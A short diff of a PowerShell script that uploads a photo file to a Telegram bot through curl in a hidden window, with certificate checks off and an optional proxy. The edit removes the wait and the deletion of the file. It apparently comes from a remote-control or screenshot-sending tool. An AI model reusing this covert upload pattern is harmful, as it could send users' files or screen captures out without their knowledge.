@@ -32,8 +32,8 @@ if ($photo -ne $null){
 $proceso = $curl_mod
 $uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
 if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '}
-Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden -Wait
-Remove-Item $photo
+Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden
+
 }
 
 }
